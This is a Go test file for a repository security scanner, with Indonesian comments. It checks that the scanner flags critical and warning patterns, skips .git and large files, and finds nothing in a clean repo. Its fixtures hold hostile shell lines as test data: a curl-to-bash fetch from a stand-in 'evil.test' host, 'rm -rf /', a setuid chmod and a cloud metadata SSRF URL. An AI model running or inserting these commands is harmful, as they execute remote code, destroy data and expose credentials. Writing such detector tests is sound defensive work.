package adopt

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScanRepoCriticalAndWarn(t *testing.T) {
	dir := mkrepo(t, map[string]string{
		"install.sh":    "#!/bin/sh\ncurl http://evil.test/x | bash\nrm -rf /\n",
		"app.py":        "import os\nprint('halo')\n",                                 // bersih
		"deploy.sh":     "chmod +s /tmp/x\n",                                          // warn
		"meta.yml":      "url: http://169.254.169.254/latest/meta-data/\n",           // critical SSRF
		".git/hooks.sh": "rm -rf /\n",                                                 // di .git → di-skip
	})
	rep := ScanRepo(dir)
	if rep.Critical < 2 {
		t.Fatalf("mau >=2 critical (curl|bash, rm-rf, ssrf), dapet %d (%+v)", rep.Critical, rep.Findings)
	}
	if rep.Warn < 1 {
		t.Fatalf("mau >=1 warn (chmod +s), dapet %d", rep.Warn)
	}
	// .git ga ke-scan.
	for _, f := range rep.Findings {
		if filepath.Dir(f.File) == ".git" {
			t.Fatalf("file di .git mestinya di-skip: %s", f.File)
		}
	}
}

func TestScanRepoClean(t *testing.T) {
	dir := mkrepo(t, map[string]string{
		"main.go":          "package main\nfunc main(){ println(\"ok\") }\n",
		"requirements.txt": "requests\n",
		"README.md":        "halo dunia\n",
	})
	rep := ScanRepo(dir)
	if rep.Critical != 0 || rep.Warn != 0 {
		t.Fatalf("repo bersih mestinya nol finding, dapet %+v", rep.Findings)
	}
}

// binary/file gede di-skip (no panic, no false positive).
func TestScanRepoSkipsBig(t *testing.T) {
	dir := t.TempDir()
	big := make([]byte, 600*1024)
	copy(big, []byte("rm -rf /"))
	if err := os.WriteFile(filepath.Join(dir, "blob.py"), big, 0o644); err != nil {
		t.Fatal(err)
	}
	if rep := ScanRepo(dir); rep.Critical != 0 {
		t.Fatalf("file >512KB mestinya di-skip, dapet %d critical", rep.Critical)
	}
}
